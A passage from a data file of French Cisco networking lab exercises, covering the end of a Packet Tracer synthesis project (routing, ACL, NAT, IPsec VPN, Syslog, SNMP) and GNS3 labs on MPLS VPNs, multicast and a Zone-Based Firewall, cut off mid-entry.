          { os: "linux", cmd: "# OSPF sur R-CORE-A :\nrouter ospf 1\nrouter-id 1.1.1.1\nnetwork 192.168.10.0 0.0.0.255 area 0\nnetwork 192.168.20.0 0.0.0.255 area 0\nnetwork 10.1.1.0 0.0.0.3 area 0\npassive-interface GigabitEthernet0/0.10\npassive-interface GigabitEthernet0/0.20\nexit", commentaire: "OSPF aire 0 — passive-interface sur les sous-interfaces VLAN (pas de Hello vers les PCs)" },
          { os: "linux", cmd: "# OSPF sur R-CORE-B (router-id 2.2.2.2, network 10.1.2.0 0.0.0.3) et R-WAN-CENTRAL (router-id 3.3.3.3, network 10.1.1.0 et 10.1.2.0)\nshow ip ospf neighbor\nshow ip route ospf", commentaire: "Compléter la configuration OSPF symétrique et vérifier les adjacences FULL" },
          { os: "linux", cmd: "# EIGRP sur R-WAN-CENTRAL :\nrouter eigrp 100\nnetwork 172.16.1.0 0.0.0.3\nno auto-summary\nexit\n# EIGRP sur R-AGENCE :\ninterface GigabitEthernet0/0\nip address 192.168.50.254 255.255.255.0\nno shutdown\nexit\ninterface Serial0/0/0\nip address 172.16.1.2 255.255.255.252\nno shutdown\nexit\nrouter eigrp 100\nnetwork 172.16.1.0 0.0.0.3\nnetwork 192.168.50.0 0.0.0.255\nno auto-summary\nexit", commentaire: "EIGRP AS 100 entre R-WAN-CENTRAL et R-AGENCE — no auto-summary obligatoire en VLSM" },
          { os: "linux", cmd: "show ip eigrp neighbors\nshow ip route eigrp\n# Constat attendu : aucune route OSPF chez R-AGENCE, aucune route EIGRP chez R-CORE-A/B (normal, redistribution en séance 3)", commentaire: "Vérifications croisées de fin de séance 2" }
        ],
        erreurs_courantes: [
          { symptome: "Numéro de groupe HSRP différent entre R-CORE-A et R-CORE-B", cause: "Erreur invisible en apparence qui empêche toute bascule", solution: "Le numéro de groupe (standby 10, standby 20) doit être identique sur les deux routeurs pour un même VLAN" },
          { symptome: "passive-interface non appliqué sur les sous-interfaces VLAN", cause: "OSPF envoie des Hello inutiles vers les postes utilisateurs qui ne sont pas des routeurs OSPF", solution: "Appliquer systématiquement passive-interface sur toute interface connectée uniquement à des hôtes finaux" },
          { symptome: "Routes EIGRP/OSPF manquantes après redistribution future", cause: "Anticiper : sans no auto-summary, EIGRP résume abusivement les sous-réseaux VLSM", solution: "Toujours désactiver l'auto-résumé avec no auto-summary sur les réseaux modernes en VLSM" }
        ]
      },
      {
        titre: "Séance 3 (3h30) — Interconnexion et sécurité périmétrique : redistribution, ACL, NAT/PAT, VPN",
        contexte: "Jonction des domaines OSPF et EIGRP par redistribution mutuelle sur R-WAN-CENTRAL. Mise en place d'une ACL étendue bloquant le trafic Agence vers Production (VLAN 20) tout en autorisant le sens inverse. Configuration du NAT/PAT pour l'accès Internet du siège, et d'un tunnel VPN IPsec site-à-site entre R-CORE-A et R-AGENCE. À partir de cette séance, le guidage diminue : NAT/PAT et VPN sont à construire à partir d'objectifs et de rappels de syntaxe, sans commandes complètes fournies.",
        commandes: [
          { os: "linux", cmd: "# Redistribution sur R-WAN-CENTRAL — EIGRP vers OSPF :\nrouter ospf 1\nredistribute eigrp 100 subnets\nexit\n# OSPF vers EIGRP (avec métrique de départ) :\nrouter eigrp 100\nredistribute ospf 1 metric 10000 100 255 1 1500\nexit", commentaire: "Le mot-clé subnets est indispensable pour redistribuer les sous-réseaux VLSM (/30) dans OSPF" },
          { os: "linux", cmd: "show ip route\n# Attendu sur R-CORE-A : route O E2 vers 192.168.50.0/24\n# Attendu sur R-AGENCE : routes D EX vers 192.168.10.0/24 et 192.168.20.0/24\n# Test : ping PC-ADMIN -> 192.168.50.x, tracert en cas d'échec", commentaire: "Vérifier la redistribution croisée et tester la connectivité end-to-end" },
          { os: "linux", cmd: "# ACL étendue sur R-AGENCE — bloquer Agence vers Production :\nip access-list extended BLOQUER_VERS_PRODUCTION\ndeny ip 192.168.50.0 0.0.0.255 192.168.20.0 0.0.0.255\npermit ip any any\nexit\ninterface GigabitEthernet0/0\nip access-group BLOQUER_VERS_PRODUCTION in\nexit", commentaire: "ACL étendue (filtrage src+dst) appliquée au plus près de la source, sens IN sur le LAN agence" },
          { os: "linux", cmd: "show access-lists\n# Test : ping depuis l'agence vers VLAN20 (doit échouer) et vers VLAN10 (doit réussir)\n# Test inverse : ping PC-PROD -> agence (doit réussir, ACL appliquée dans un seul sens)", commentaire: "Vérifier les compteurs de correspondance et la directionnalité du filtrage" },
          { os: "linux", cmd: "# NAT/PAT sur R-WAN-CENTRAL — À CONSTRUIRE (objectifs) :\n# 1. ACL standard identifiant le trafic VLAN10+VLAN20 à translater\n# 2. ip nat inside sur les sous-interfaces LAN, ip nat outside sur l'interface publique\n# 3. ip nat inside source list [ACL] interface [interface publique] overload\n# Rappel : le NAT nécessite une route vers 203.0.113.0/29 et un positionnement correct inside/outside", commentaire: "PAT à construire soi-même — tous les postes du siège partagent l'IP publique 203.0.113.1" },
          { os: "linux", cmd: "# Vérifications à identifier soi-même (indices) :\n# show ip nat translations\n# show ip nat statistics\n# Test : ping depuis PC-ADMIN vers l'interface publique de R-WAN-CENTRAL", commentaire: "Documenter le résultat du test NAT dans le rapport de recette" },
          { os: "linux", cmd: "# VPN site-à-site IPsec R-CORE-A <-> R-AGENCE — À CONSTRUIRE (squelette) :\n# crypto isakmp policy 10 (encryption aes 256, authentication pre-share, group 2)\n# crypto isakmp key [clé] address [IP publique du pair distant]\n# crypto ipsec transform-set [NOM] esp-aes esp-sha-hmac\n# ACL de trafic intéressant : permit ip [réseau local] [wildcard] [réseau distant] [wildcard]\n# crypto map [NOM] 10 ipsec-isakmp (match address [ACL], set peer [IP distante], set transform-set [NOM])\n# Application sur l'interface publique de sortie : crypto map [NOM]", commentaire: "Configuration symétrique et miroir obligatoire entre R-CORE-A et R-AGENCE (ACL inversée, peer croisé)" },
          { os: "linux", cmd: "# Vérifications à identifier soi-même (indices) :\n# show crypto isakmp sa (phase 1 — état QM_IDLE attendu)\n# show crypto ipsec sa (phase 2 — compteurs de paquets chiffrés/déchiffrés)\n# Le tunnel ne se négocie qu'au passage du premier paquet de trafic intéressant", commentaire: "Un simple ping siège <-> agence doit déclencher l'établissement du tunnel" }
        ],
        erreurs_courantes: [
          { symptome: "Routes manquantes après redistribution apparemment réussie", cause: "Mot-clé subnets oublié sur redistribute eigrp 100 subnets", solution: "Sans subnets, OSPF ne redistribue que les routes correspondant à une frontière de classe d'adresse, ignorant les sous-réseaux VLSM" },
          { symptome: "ACL bloque tout le trafic de l'agence, y compris vers VLAN10 et Internet", cause: "Ligne permit ip any any oubliée en fin d'ACL étendue", solution: "Toute ACL qui ne doit bloquer qu'un flux précis doit se terminer par une autorisation explicite du reste" },
          { symptome: "NAT configuré sans erreur visible mais aucune translation ne se produit", cause: "Interfaces inside/outside mal positionnées, ou absence de route vers le réseau public", solution: "Vérifier scrupuleusement ip nat inside côté LAN et ip nat outside côté interface publique. Vérifier la route par défaut vers 203.0.113.0/29." },
          { symptome: "Tunnel VPN ne se négocie jamais", cause: "Clé pré-partagée différente entre les deux extrémités, ou ACL de trafic intéressant non symétrique", solution: "La configuration VPN doit être rigoureusement miroir : ACL inversée source/destination, peer pointant vers l'IP de l'AUTRE extrémité" }
        ]
      },
      {
        titre: "Séance 4 (3h30) — Supervision, dépannage et évaluation pratique notée",
        contexte: "Centralisation des journaux avec Syslog et supervision active avec SNMPv2c sur SRV-SUPERVISION (VLAN 192.168.99.0/24). Présentation de la méthodologie de diagnostic réseau (bottom-up, top-down, diviser pour régner). Séance conclue par une épreuve pratique notée de 1h30 : une ou plusieurs pannes sont injectées dans la configuration, à diagnostiquer et corriger en autonomie, avec rédaction d'une fiche d'intervention.",
        commandes: [
          { os: "linux", cmd: "# Syslog — sur chaque routeur (R-CORE-A, R-CORE-B, R-WAN-CENTRAL, R-AGENCE) :\nlogging host 192.168.99.10\nlogging trap informational\nservice timestamps log datetime msec", commentaire: "Envoi des logs niveau informational (6) vers SRV-SUPERVISION, horodatage absolu indispensable" },
          { os: "linux", cmd: "# Côté SRV-SUPERVISION : Services > SYSLOG > On\nshow logging\n# Test : basculer une interface en shutdown puis no shutdown et vérifier la réception du message", commentaire: "Activer le service Syslog sur le serveur et valider la réception" },
          { os: "linux", cmd: "# SNMPv2c — sur chaque routeur à superviser :\nsnmp-server community ALPHATECH-RO RO\nsnmp-server location SIEGE-SOCIAL-ALPHATECH\nsnmp-server contact admin@alphatech.local\nsnmp-server host 192.168.99.10 version 2c ALPHATECH-RO\nsnmp-server enable traps", commentaire: "Communauté en lecture seule + envoi de traps vers le serveur de supervision" },
          { os: "linux", cmd: "# Côté SRV-SUPERVISION : Services > SNMP > déclarer la communauté ALPHATECH-RO\nshow snmp\nshow running-config | include snmp", commentaire: "Activer SNMP côté serveur avec la même communauté que les équipements" },
          { os: "linux", cmd: "# Méthodologie de dépannage — boîte à outils :\nping / tracert (connectivité L3 et chemin emprunté)\nshow ip interface brief (état admin/opérationnel des interfaces)\nshow ip route (présence de la route vers la destination)\nshow vlan brief / show interfaces trunk (cohérence VLAN)\nshow standby brief (état HSRP actif/standby)\nshow ip ospf neighbor / show ip eigrp neighbors (voisinages routage)\nshow access-lists (règles et compteurs de correspondance)\nshow ip nat translations (translations actives)\nshow logging (historique des événements)", commentaire: "Démarche en 5 étapes : symptôme -> hypothèses -> tests -> cause racine -> correction + validation" },
          { os: "linux", cmd: "# ÉPREUVE PRATIQUE NOTÉE (1h30, individuelle) :\n# Le formateur injecte 1 ou plusieurs pannes parmi : VLAN/trunk, HSRP, DHCP, routage OSPF/EIGRP,\n# ACL inversée, NAT inside/outside mal positionné, VPN clé/ACL asymétrique, Syslog/SNMP mal configuré\n# Objectif : restaurer intégralement le cahier des charges fonctionnel de l'infrastructure", commentaire: "Diagnostiquer et corriger en autonomie, sans entraide entre stagiaires" },
          { os: "linux", cmd: "# Fiche d'intervention à produire :\n# 1. Symptôme constaté\n# 2. Démarche de diagnostic suivie (commandes + résultats à chaque étape)\n# 3. Cause racine identifiée\n# 4. Correction appliquée (commande exacte)\n# 5. Validation finale (capture show ou ping/tracert prouvant la résolution)", commentaire: "Structure de la fiche d'intervention — 15% de la note finale" }
        ],
        erreurs_courantes: [
          { symptome: "Messages Syslog reçus avec un compteur relatif inexploitable", cause: "service timestamps log datetime msec non configuré", solution: "Sans cette commande, impossible de corréler des événements survenus sur plusieurs équipements différents" },
          { symptome: "SNMP ne répond pas malgré une configuration apparemment correcte", cause: "Communauté différente entre le serveur de supervision et les équipements interrogés", solution: "Vérifier que ALPHATECH-RO est strictement identique des deux côtés (sensible à la casse)" },
          { symptome: "Modification de paramètres au hasard pendant l'épreuve sans méthode", cause: "Absence de démarche structurée — erreur la plus fréquente d'un technicien débutant", solution: "Toujours suivre la méthode diviser-pour-régner : tester une couche intermédiaire (ping), isoler le côté en cause, puis affiner avant de modifier quoi que ce soit" }
        ]
      }
    ],
    checklist: [
      "Séance 1 : VLANs 10/20 actifs, trunk 802.1Q opérationnel, Port Security sticky/shutdown fonctionnel, DHCP distribue des baux cohérents",
      "Séance 2 : show standby brief = R-CORE-A Active/R-CORE-B Standby sur les 2 VLANs, bascule HSRP testée avec perte minimale, voisinages OSPF FULL et EIGRP établis",
      "Séance 3 : redistribution croisée visible (routes O E2 et D EX), ACL Agence->Production bloque sélectivement, NAT/PAT fonctionnel vers Internet simulé, tunnel VPN établi (ISAKMP + IPsec SA actifs)",
      "Séance 4 : logs Syslog centralisés et horodatés sur SRV-SUPERVISION, SNMP interrogeable avec la bonne communauté",
      "Épreuve pratique : panne injectée diagnostiquée méthodiquement, cause racine identifiée, correction validée, fiche d'intervention complète",
      "Fiche de recette globale (Annexe C) intégralement cochée en fin de projet"
    ],
    tags: ["packet-tracer", "synthese", "vlan", "hsrp", "ospf", "eigrp", "redistribution", "acl", "nat", "vpn", "ipsec", "syslog", "snmp", "depannage", "projet", "avance", "bts-sio"],
    date_ajout: "2026-06-27",
    source: "École"
  }

,

  {
    id: 112,
    titre: "MPLS — VPN L3 et commutation par labels sur GNS3",
    categorie: "reseau",
    niveau: "avancé",
    duree: 105,
    description: "Découvrir MPLS (Multiprotocol Label Switching), la technologie de cœur de réseau utilisée par les FAI et grandes entreprises pour acheminer le trafic par labels plutôt que par lookup IP complet. Configuration d'un PE-CE-PE basique avec VRF (Virtual Routing and Forwarding) pour simuler un VPN L3 MPLS entre deux sites clients isolés.",
    objectifs: [
      "Comprendre le principe de la commutation par labels (LFIB, LSP)",
      "Configurer MPLS LDP entre routeurs du cœur de réseau",
      "Créer des VRF pour isoler le trafic de différents clients",
      "Configurer MP-BGP pour l'échange de routes VPNv4",
      "Vérifier l'étanchéité entre VRF clients distincts"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+ avec GNS3 VM (VMware ou VirtualBox)", lien: "https://gns3.com" },
      { type: "vm", nom: "4x Cisco IOSv 15.x (P1, P2 = cœur MPLS, PE1, PE2 = routeurs frontière)" },
      { type: "vm", nom: "2x routeurs CE simulant deux clients distincts (CE1-ClientA, CE2-ClientA, CE1-ClientB)" },
      { type: "reseau", nom: "Topologie : CE-ClientA -- PE1 -- P1 -- P2 -- PE2 -- CE-ClientA(site2). Cœur MPLS en OSPF, loopbacks PE/P en /32" },
      { type: "reseau", nom: "MPLS nécessite des images IOS supportant mpls ip — vérifier la compatibilité avant de commencer" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Cœur MPLS : OSPF et LDP",
        contexte: "Le cœur MPLS (P1, P2, PE1, PE2) doit d'abord avoir une connectivité IP via IGP (OSPF), puis on active MPLS et LDP (Label Distribution Protocol) qui distribue automatiquement les labels entre routeurs adjacents.",
        commandes: [
          { os: "linux", cmd: "# Sur tous les routeurs du cœur (PE1, P1, P2, PE2) :\nPE1(config)# router ospf 1\nPE1(config-router)# network 10.0.0.0 0.255.255.255 area 0\nPE1(config-router)# network 1.1.1.1 0.0.0.0 area 0", commentaire: "OSPF dans le cœur — toutes les loopbacks et liens P2P annoncés" },
          { os: "linux", cmd: "# Activer MPLS sur chaque interface du cœur :\nPE1(config)# mpls ip\nPE1(config)# interface GigabitEthernet0/1\nPE1(config-if)# mpls ip", commentaire: "Activer MPLS globalement puis sur chaque interface reliant les routeurs du cœur" },
          { os: "linux", cmd: "PE1# show mpls ldp neighbor", commentaire: "Vérifier les voisins LDP — doit afficher P1 et les autres routeurs adjacents" },
          { os: "linux", cmd: "PE1# show mpls forwarding-table", commentaire: "Table de labels — montre l'association label entrant/sortant pour chaque préfixe" }
        ],
        erreurs_courantes: [
          { symptome: "show mpls ldp neighbor : aucun voisin", cause: "mpls ip non activé sur l'interface ou OSPF non établi", solution: "Vérifier que mpls ip est sur l'interface ET que show ip ospf neighbor montre une adjacence FULL au préalable" }
        ]
      },
      {
        titre: "Étape 2 — Créer les VRF pour isoler les clients",
        contexte: "Une VRF (Virtual Routing and Forwarding) crée une table de routage indépendante sur le routeur PE pour chaque client. Deux clients différents peuvent même utiliser les mêmes plages d'adresses privées sans conflit, car leurs tables sont totalement séparées.",
        commandes: [
          { os: "linux", cmd: "# Sur PE1 — créer la VRF pour ClientA :\nPE1(config)# ip vrf CLIENT_A\nPE1(config-vrf)# rd 65000:1\nPE1(config-vrf)# route-target export 65000:1\nPE1(config-vrf)# route-target import 65000:1", commentaire: "RD (Route Distinguisher) rend les préfixes uniques, route-target contrôle l'import/export entre PE" },
          { os: "linux", cmd: "# Associer l'interface vers CE-ClientA à la VRF :\nPE1(config)# interface GigabitEthernet0/0\nPE1(config-if)# ip vrf forwarding CLIENT_A\nPE1(config-if)# ip address 192.168.1.1 255.255.255.0", commentaire: "L'interface PE-CE appartient désormais à la VRF CLIENT_A" },
          { os: "linux", cmd: "PE1# show ip vrf\nPE1# show ip route vrf CLIENT_A", commentaire: "Vérifier la VRF créée et sa table de routage indépendante" }
        ],
        erreurs_courantes: [
          { symptome: "ip address réapplique l'IP mais la VRF semble vide", cause: "ip vrf forwarding doit être appliqué AVANT ip address, sinon l'IP précédente est effacée", solution: "Toujours appliquer ip vrf forwarding avant de (re)configurer l'adresse IP sur l'interface" }
        ]
      },
      {
        titre: "Étape 3 — MP-BGP pour échanger les routes VPNv4",
        contexte: "MP-BGP (Multiprotocol BGP) entre PE1 et PE2 transporte les préfixes clients encapsulés avec leur RD (format VPNv4). C'est ce qui permet à PE2 de savoir comment joindre le réseau du ClientA derrière PE1.",
        commandes: [
          { os: "linux", cmd: "# Sur PE1 :\nPE1(config)# router bgp 65000\nPE1(config-router)# neighbor 4.4.4.4 remote-as 65000\nPE1(config-router)# neighbor 4.4.4.4 update-source Loopback0\nPE1(config-router)# address-family vpnv4\nPE1(config-router-af)# neighbor 4.4.4.4 activate\nPE1(config-router-af)# exit-address-family", commentaire: "Session MP-BGP vers PE2 (loopback 4.4.4.4), activée pour l'address-family vpnv4" },
          { os: "linux", cmd: "# Redistribuer les routes CE dans la VRF (PE-CE en statique ou OSPF/eBGP selon le contexte) :\nPE1(config)# router bgp 65000\nPE1(config-router)# address-family ipv4 vrf CLIENT_A\nPE1(config-router-af)# redistribute connected\nPE1(config-router-af)# exit-address-family", commentaire: "Injecter les routes connectées de la VRF dans MP-BGP pour les annoncer à PE2" },
          { os: "linux", cmd: "PE1# show bgp vpnv4 unicast all\nPE2# show ip route vrf CLIENT_A", commentaire: "Vérifier que PE2 reçoit bien les routes du ClientA via MP-BGP" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Vérifier l'étanchéité entre VRF",
        contexte: "On crée une seconde VRF pour ClientB et on vérifie qu'aucun trafic ne peut transiter entre CLIENT_A et CLIENT_B malgré le partage de la même infrastructure physique — c'est la garantie fondamentale du VPN MPLS.",
        commandes: [
          { os: "linux", cmd: "# Créer VRF CLIENT_B avec un RD différent :\nPE1(config)# ip vrf CLIENT_B\nPE1(config-vrf)# rd 65000:2\nPE1(config-vrf)# route-target export 65000:2\nPE1(config-vrf)# route-target import 65000:2", commentaire: "VRF totalement isolée, RD distinct empêchant tout chevauchement" },
          { os: "linux", cmd: "# Tester l'étanchéité :\nPE1# ping vrf CLIENT_A 192.168.2.1\n# Doit échouer si 192.168.2.1 appartient à CLIENT_B (table de routage différente)\nPE1# show ip route vrf CLIENT_B", commentaire: "Confirmer qu'aucune route de CLIENT_A n'apparaît dans la table de CLIENT_B" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "show mpls ldp neighbor : voisinages LDP établis dans le cœur",
      "show mpls forwarding-table : labels assignés aux préfixes du cœur",
      "show ip vrf : VRF CLIENT_A et CLIENT_B créées avec RD distincts",
      "MP-BGP : show bgp vpnv4 unicast all affiche les routes des deux VRF",
      "show ip route vrf CLIENT_A sur PE2 : routes du site distant ClientA visibles",
      "Étanchéité confirmée : aucune fuite de route entre CLIENT_A et CLIENT_B"
    ],
    tags: ["mpls", "vrf", "vpn-l3", "mp-bgp", "ldp", "label-switching", "cisco", "gns3", "fai", "avance"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 113,
    titre: "Multicast IP — PIM et IGMP pour diffusion vidéo/streaming",
    categorie: "reseau",
    niveau: "avancé",
    duree: 75,
    description: "Configurer le routage multicast IP sur Cisco avec PIM (Protocol Independent Multicast) en mode Dense et Sparse, et comprendre IGMP (Internet Group Management Protocol) pour la gestion des abonnements aux groupes multicast côté client. Cas d'usage : diffusion vidéo/streaming en entreprise sans dupliquer le flux par destinataire.",
    objectifs: [
      "Comprendre la différence entre unicast, broadcast et multicast",
      "Configurer PIM Dense Mode entre routeurs",
      "Configurer PIM Sparse Mode avec un Rendezvous Point (RP)",
      "Comprendre IGMPv2/v3 et l'abonnement des hôtes",
      "Vérifier l'arbre de distribution multicast (mroute)"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+ avec GNS3 VM (VMware ou VirtualBox)", lien: "https://gns3.com" },
      { type: "vm", nom: "3x Cisco IOSv 15.x (R1, R2, R3) en topologie maillée" },
      { type: "vm", nom: "2x VMs Linux ou VPCS simulant un émetteur de flux multicast et un récepteur abonné" },
      { type: "reseau", nom: "Adressage : réseaux unicast standard + groupe multicast de test 239.1.1.1 (plage administratively scoped 239.0.0.0/8)" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Activer le routage multicast et PIM Dense Mode",
        contexte: "On active globalement le routage multicast puis PIM en mode Dense sur chaque interface. Le mode Dense inonde le flux partout puis élague (prune) les branches sans récepteur — adapté aux petits réseaux avec beaucoup de récepteurs.",
        commandes: [
          { os: "linux", cmd: "# Sur tous les routeurs :\nR1(config)# ip multicast-routing\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# ip pim dense-mode\nR1(config)# interface GigabitEthernet0/1\nR1(config-if)# ip pim dense-mode", commentaire: "Activer le multicast globalement et PIM Dense sur chaque interface participant à la diffusion" },
          { os: "linux", cmd: "R1# show ip pim neighbor", commentaire: "Vérifier les voisins PIM découverts automatiquement" },
          { os: "linux", cmd: "R1# show ip pim interface", commentaire: "Afficher le mode PIM actif et le nombre de voisins par interface" }
        ],
        erreurs_courantes: [
          { symptome: "Aucun voisin PIM détecté", cause: "ip multicast-routing non activé globalement", solution: "La commande globale ip multicast-routing est un prérequis absolu avant toute configuration ip pim sur les interfaces" }
        ]
      },
      {
        titre: "Étape 2 — IGMP côté récepteur et test du flux",
        contexte: "IGMP permet à un hôte de signaler son intérêt pour un groupe multicast au routeur le plus proche. On simule l'abonnement et on génère un flux multicast de test.",
        commandes: [
          { os: "linux", cmd: "# Sur l'interface du routeur connectée au récepteur :\nR3(config)# interface GigabitEthernet0/1\nR3(config-if)# ip igmp version 2", commentaire: "Forcer IGMPv2 (compatible avec la majorité des clients de test)" },
          { os: "linux", cmd: "# Simuler l'abonnement statique du récepteur (sans véritable client IGMP) :\nR3(config-if)# ip igmp static-group 239.1.1.1", commentaire: "Forcer le routeur à se comporter comme s'il avait un récepteur abonné — utile en lab sans client réel" },
          { os: "linux", cmd: "R3# show ip igmp groups", commentaire: "Vérifier que le groupe 239.1.1.1 est bien enregistré sur l'interface" },
          { os: "linux", cmd: "# Depuis la VM émettrice, générer un flux multicast de test (ping vers le groupe) :\nping 239.1.1.1 -t -c 10", commentaire: "Envoyer du trafic vers le groupe multicast" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 3 — Vérifier l'arbre de distribution multicast",
        contexte: "La table mroute montre comment le flux multicast est acheminé : interface entrante (RPF) et liste des interfaces sortantes vers les récepteurs.",
        commandes: [
          { os: "linux", cmd: "R1# show ip mroute", commentaire: "Afficher l'arbre de distribution — (S,G) pour le couple source/groupe, ou (*,G) en Sparse Mode" },
          { os: "linux", cmd: "R1# show ip mroute 239.1.1.1", commentaire: "Détail pour le groupe spécifique : Incoming interface (RPF) et Outgoing interface list (OIL)" },
          { os: "linux", cmd: "R1# show ip rpf 192.168.1.10", commentaire: "Vérifier le chemin RPF (Reverse Path Forwarding) vers la source — base du contrôle anti-boucle multicast" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Passer en PIM Sparse Mode avec Rendezvous Point",
        contexte: "Le mode Sparse est plus efficace à grande échelle : au lieu d'inonder le réseau, les routeurs s'enregistrent auprès d'un Rendezvous Point (RP) central qui connaît les sources actives.",
        commandes: [
          { os: "linux", cmd: "# Désigner R2 comme RP statique :\nR1(config)# interface loopback 0\nR1(config-if)# ip address 2.2.2.2 255.255.255.255\nR2(config)# ip pim rp-address 2.2.2.2", commentaire: "Configurer un RP statique sur tous les routeurs (R2 = adresse du RP)" },
          { os: "linux", cmd: "# Basculer toutes les interfaces en Sparse Mode :\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# no ip pim dense-mode\nR1(config-if)# ip pim sparse-mode", commentaire: "Remplacer dense-mode par sparse-mode sur chaque interface" },
          { os: "linux", cmd: "R1# show ip pim rp mapping\nR1# show ip mroute", commentaire: "Vérifier le RP configuré et observer le changement de structure de l'arbre (*, G) centré sur le RP" }
        ],
        erreurs_courantes: [
          { symptome: "Sparse Mode : aucun trafic ne passe malgré la config RP", cause: "Le RP n'est pas configuré de manière identique sur TOUS les routeurs du domaine PIM", solution: "ip pim rp-address doit être configuré avec la même adresse sur chaque routeur participant" }
        ]
      }
    ],
    checklist: [
      "ip multicast-routing actif et show ip pim neighbor liste les voisins",
      "show ip igmp groups : groupe 239.1.1.1 enregistré sur R3",
      "show ip mroute : entrée (S,G) ou (*,G) visible avec OIL correct",
      "Flux ping multicast reçu côté récepteur",
      "Passage en Sparse Mode : show ip pim rp mapping affiche le RP",
      "Arbre de distribution recentré sur le RP en mode Sparse"
    ],
    tags: ["multicast", "pim", "igmp", "streaming", "rendezvous-point", "cisco", "gns3", "avance"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 114,
    titre: "Zone-Based Firewall — pare-feu stateful intégré Cisco IOS",
    categorie: "reseau",
    niveau: "avancé",
    duree: 75,
    description: "Configurer le Zone-Based Firewall (ZBF/ZFW) de Cisco IOS, un pare-feu stateful intégré au routeur qui inspecte les connexions et autorise automatiquement le trafic de retour, contrairement aux ACL classiques. On définit des zones de sécurité, des policy-maps d'inspection et on observe le suivi de session.",
    objectifs: [
      "Comprendre le concept de zones de sécurité et de pare-feu stateful",
      "Configurer les zones et l'affectation des interfaces",
      "Créer une class-map et policy-map d'inspection",
      "Appliquer une zone-pair entre deux zones",
      "Vérifier le suivi des sessions inspectées"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+ avec GNS3 VM (VMware ou VirtualBox)", lien: "https://gns3.com" },
      { type: "vm", nom: "1x Cisco IOSv 15.x avec image supportant Zone-Based Firewall (Security ou Advanced IP Services)" },
      { type: "vm", nom: "2x VMs Linux ou VPCS simulant un client LAN et un serveur côté WAN/Internet simulé" },
      { type: "reseau", nom: "Topologie : LAN interne (192.168.1.0/24) -- Routeur ZBF -- WAN externe (203.0.113.0/24)" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Créer les zones de sécurité",
        contexte: "Une zone regroupe des interfaces ayant le même niveau de confiance. On crée typiquement une zone INSIDE (LAN, confiance) et une zone OUTSIDE (WAN, non fiable). Le trafic entre deux interfaces de la même zone passe librement par défaut ; entre deux zones différentes, tout est bloqué sauf policy explicite.",
        commandes: [
          { os: "linux", cmd: "R1(config)# zone security INSIDE\nR1(config-sec-zone)# exit\nR1(config)# zone security OUTSIDE\nR1(config-sec-zone)# exit", commentaire: "Créer les deux zones de sécurité" },
          { os: "linux", cmd: "# Affecter les interfaces aux zones :\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# zone-member security INSIDE\nR1(config)# interface GigabitEthernet0/1\nR1(config-if)# zone-member security OUTSIDE", commentaire: "Interface LAN dans INSIDE, interface WAN dans OUTSIDE" },
          { os: "linux", cmd: "R1# show zone security", commentaire: "Vérifier les zones créées et les interfaces membres" }
        ],
        erreurs_courantes: [
          { symptome: "Plus aucun trafic ne passe entre LAN et WAN après affectation des zones", cause: "Comportement normal et volontaire : sans zone-pair et policy explicite, tout le trafic inter-zone est implicitement refusé", solution: "C'est attendu — il faut créer la zone-pair et la policy-map d'inspection pour autoriser le trafic légitime (étapes suivantes)" }
        ]
      },
      {
        titre: "Étape 2 — Class-map et policy-map d'inspection",
        contexte: "La class-map identifie le trafic à traiter, la policy-map définit l'action (inspect = stateful, pass = sans état, drop = bloquer). L'action inspect crée une table de sessions et autorise automatiquement le trafic de retour.",
        commandes: [
          { os: "linux", cmd: "# Class-map identifiant le trafic à inspecter (HTTP, HTTPS, DNS, ICMP) :\nR1(config)# class-map type inspect match-any TRAFIC_AUTORISE\nR1(config-cmap)# match protocol http\nR1(config-cmap)# match protocol https\nR1(config-cmap)# match protocol dns\nR1(config-cmap)# match protocol icmp\nR1(config-cmap)# exit", commentaire: "match-any : le trafic correspondant à au moins un protocole listé est classifié" },
          { os: "linux", cmd: "# Policy-map appliquant l'inspection stateful :\nR1(config)# policy-map type inspect POLICY_INSIDE_TO_OUTSIDE\nR1(config-pmap)# class type inspect TRAFIC_AUTORISE\nR1(config-pmap-c)# inspect\nR1(config-pmap-c)# exit\nR1(config-pmap)# class class-default\nR1(config-pmap-c)# drop\nR1(config-pmap-c)# exit", commentaire: "inspect = suivi stateful avec autorisation automatique du retour, drop par défaut pour le reste" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 3 — Zone-pair et application de la policy",
        contexte: "La zone-pair définit le SENS du trafic (source-zone vers destination-zone) auquel la policy s'applique. Pour un firewall classique, on inspecte le trafic INSIDE vers OUTSIDE, ce qui autorise automatiquement les réponses OUTSIDE vers INSIDE pour ces sessions.",
        commandes: [
          { os: "linux", cmd: "R1(config)# zone-pair security INSIDE_TO_OUTSIDE source INSIDE destination OUTSIDE\nR1(config-sec-zone-pair)# service-policy type inspect POLICY_INSIDE_TO_OUTSIDE\nR1(config-sec-zone-pair)# exit", commentaire: "Appliquer la policy d'inspection sur le sens LAN -> WAN" },
          { os: "linux", cmd: "R1# show policy-map type inspect zone-pair INSIDE_TO_OUTSIDE", commentaire: "Vérifier la zone-pair et la policy associée" },
          { os: "linux", cmd: "# Test depuis le client LAN :\n# curl http://203.0.113.10 (doit fonctionner — inspect autorise et suit la session)\n# Test depuis le serveur WAN vers le LAN (doit échouer — pas de zone-pair OUTSIDE->INSIDE)", commentaire: "Le trafic initié depuis OUTSIDE vers INSIDE doit être bloqué (pas de policy dans ce sens)" }
        ],
        erreurs_courantes: [
